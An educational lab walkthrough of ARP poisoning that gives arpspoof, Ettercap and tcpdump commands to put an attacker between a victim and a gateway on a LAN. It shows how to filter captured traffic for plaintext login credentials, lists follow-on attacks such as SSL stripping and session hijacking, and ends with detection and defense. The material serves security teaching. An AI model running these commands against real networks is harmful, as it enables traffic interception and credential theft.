# ARP Poisoning — Attack Walkthrough

> **Type:** Active Sniffing / Man-in-the-Middle (MITM)  
> **Tools:** arpspoof, Ettercap, Wireshark  
> ⚠️ For educational purposes only. Practice only on your own lab VMs.

---

## Background: How ARP Works

ARP (Address Resolution Protocol) maps **IP addresses to MAC addresses** on a LAN.

**Normal ARP Flow:**
```
Device A wants to talk to 192.168.1.1 (gateway)
→ Broadcasts: "Who has 192.168.1.1?"
→ Gateway replies: "192.168.1.1 is at AA:BB:CC:DD:EE:FF"
→ Device A saves this in its ARP cache
```

**Problem:** ARP has NO authentication. Anyone can send a fake ARP reply!

---

## How ARP Poisoning Works

```
Normal Traffic Flow:
Victim (192.168.1.5) ──────────────────► Gateway (192.168.1.1)

After ARP Poisoning:
Victim (192.168.1.5) ──► Attacker (192.168.1.100) ──► Gateway (192.168.1.1)
```

**Attacker sends:**
1. To Victim: "192.168.1.1 (gateway) is at MY MAC"
2. To Gateway: "192.168.1.5 (victim) is at MY MAC"

Both update their ARP caches → all traffic flows through attacker → **MITM achieved**

---

## Lab Setup

```
Lab Environment (VMs):
├── Attacker  — Kali Linux  — 192.168.1.100
├── Victim    — Windows 10  — 192.168.1.5
└── Gateway   — Router      — 192.168.1.1
```

---

## Step-by-Step Attack

### Step 1: Verify network info
```bash
ifconfig eth0                    # Note attacker IP + MAC
arp -a                           # View current ARP table
nmap -sn 192.168.1.0/24         # Discover hosts
```

### Step 2: Enable IP forwarding
```bash
# CRITICAL — without this, victim loses internet = attack detected!
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward   # Verify = 1
```

### Step 3: Launch ARP Poisoning (arpspoof)
```bash
# Terminal 1 — poison victim (tell victim: gateway's MAC = my MAC)
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1

# Terminal 2 — poison gateway (tell gateway: victim's MAC = my MAC)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5
```

### Step 4: Capture traffic
```bash
# Terminal 3 — start capturing
tcpdump -i eth0 -w arp_mitm_capture.pcap

# Or use Wireshark for real-time viewing
wireshark &
```

### Step 5: Analyze captured traffic
```bash
# Open in wireshark
wireshark arp_mitm_capture.pcap

# Filter HTTP POST (login credentials)
# Display filter: http.request.method == "POST"

# Follow TCP stream to see plaintext credentials
# Right-click → Follow → TCP Stream
```

---

## Alternative: Ettercap (All-in-One)

```bash
# GUI mode
ettercap -G

# Steps in GUI:
# 1. Sniff → Unified sniffing → select interface
# 2. Hosts → Scan for Hosts
# 3. Hosts → Host List
# 4. Add victim to Target 1, gateway to Target 2
# 5. MITM → ARP Poisoning → check "Sniff remote connections"
# 6. Start → Start Sniffing

# CLI mode
ettercap -T -q -M arp:remote /192.168.1.5// /192.168.1.1//
```

---

## Verify Attack on Victim Machine

```cmd
# On Windows victim — check ARP cache
arp -a

# Before attack:
# 192.168.1.1    AA:BB:CC:DD:EE:FF    dynamic   ← real gateway MAC

# After attack:
# 192.168.1.1    11:22:33:44:55:66    dynamic   ← attacker's MAC!
```

---

## Detection & Defense

### Detection
```bash
# Check for duplicate MACs in ARP table
arp -a | sort

# Wireshark filter
arp.duplicate-address-detected

# Tools: ARPwatch, XArp
```

### Defense
```bash
# Static ARP entry (prevents poisoning for gateway)
arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF

# On switches: Enable Dynamic ARP Inspection (DAI)
# Cisco: ip arp inspection vlan 1

# Use encrypted protocols — HTTPS, SSH (even if intercepted, data is encrypted)
```

---

## What Attacker Can Do After MITM

| Action | Tool |
|--------|------|
| Steal HTTP credentials | Wireshark / dsniff |
| Inject malicious content | ettercap plugins |
| SSL stripping (HTTPS → HTTP) | sslstrip |
| DNS spoofing | ettercap dns_spoof plugin |
| Session hijacking | Hamster + Ferret |

---

## Key Takeaways

- ARP has no authentication — inherently vulnerable
- Works only on **same LAN/subnet**
- IP forwarding must be enabled — else victim loses connectivity
- Encrypted traffic (HTTPS/SSH) protects data even during MITM
- Dynamic ARP Inspection on managed switches = best defense
